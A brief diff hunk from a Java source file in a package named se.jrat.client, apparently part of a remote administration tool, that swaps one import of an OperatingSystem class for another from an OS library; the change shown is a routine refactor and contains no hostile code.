@@ -3,7 +3,7 @@ package se.jrat.client;
 import java.util.ArrayList;
 import java.util.List;
 
-import se.jrat.common.OperatingSystem;
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public final class OSConfig {
